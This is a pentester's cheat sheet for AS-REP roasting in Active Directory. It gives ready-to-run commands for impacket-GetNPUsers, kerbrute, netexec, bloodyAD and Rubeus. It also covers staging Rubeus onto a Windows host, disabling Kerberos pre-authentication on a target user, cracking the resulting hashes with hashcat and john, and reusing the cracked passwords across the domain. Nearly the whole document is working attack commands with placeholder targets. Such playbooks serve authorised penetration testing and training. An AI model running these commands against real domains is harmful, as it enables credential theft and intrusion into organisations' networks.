# AS-REP roasting

## Before I start
sudo ntpdate <DCIP>
- [ ] A list of real usernames in users.txt: :Pb domain-enum
- [ ] No password needed: users without Kerberos pre-authentication answer anyone

## Without a credential
At the pwn-broker prompt: tool install impacket, tool install netexec and tool install bloodyad.
The / after the domain means no user of my own.
impacket-GetNPUsers '<Domain>/' -usersfile users.txt -dc-ip <DCIP> -no-pass -format hashcat -outputfile asrep.txt
- [ ] doesn't have UF_DONT_REQUIRE_PREAUTH set: the user exists, and is not roastable
- [ ] KDC_ERR_C_PRINCIPAL_UNKNOWN: no such user
One user:
impacket-GetNPUsers '<Domain>/<TargetUser>' -dc-ip <DCIP> -no-pass -format hashcat
kerbrute, from tool install kerbrute at the pwn-broker prompt, prints the hash of any roastable user it meets during userenum:
kerbrute userenum -d <Domain> --dc <DCIP> users.txt
- [ ] kerbrute's hash is AES, $18$, and slow to crack: ask again with GetNPUsers, which gets RC4

## With a credential
LDAP then names the roastable users for me.
impacket-GetNPUsers '<Domain>/<Username>:<Password>' -dc-ip <DCIP> -request -format hashcat -outputfile asrep.txt
impacket-GetNPUsers '<Domain>/<Username>' -hashes ':<Hash>' -dc-ip <DCIP> -request -format hashcat -outputfile asrep.txt
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --asreproast asrep.txt
nxc ldap <DCIP> -u users.txt -p '' --asreproast asrep.txt

## Targeted, with GenericWrite or GenericAll over a user
Pre-authentication off, roast, then on again.
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' add uac '<TargetUser>' -f DONT_REQ_PREAUTH
impacket-GetNPUsers '<Domain>/<TargetUser>' -dc-ip <DCIP> -no-pass -format hashcat -outputfile asrep.txt
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' remove uac '<TargetUser>' -f DONT_REQ_PREAUTH
- [ ] Pre-authentication back on: the last line run, every time

## From a Windows shell
At the pwn-broker prompt:
tool install rubeus
serve
serve files rubeus
On the Windows host:
- [ ] Rubeus.exe fetched with the line serve files gives
It writes John's format unless told otherwise.
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
.\Rubeus.exe asreproast /user:<TargetUser> /format:hashcat /outfile:asrep.txt /nowrap
With PowerView loaded, as in :Pb domain-enum:
Get-DomainUser -PreauthNotRequired -Properties samaccountname

## Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
- [ ] $krb5asrep$23$ is RC4, mode 18200
- [ ] $krb5asrep$17$ and $18$ are AES, modes 32100 and 32200 on hashcat 7 or later

## Next
nxc smb <DCIP> -u '<TargetUser>' -p 'THE-CRACKED-PASSWORD'
- [ ] The password tried everywhere: :Pb smb, where this credential works
- [ ] Then the whole of :Pb domain-enum again, as that user
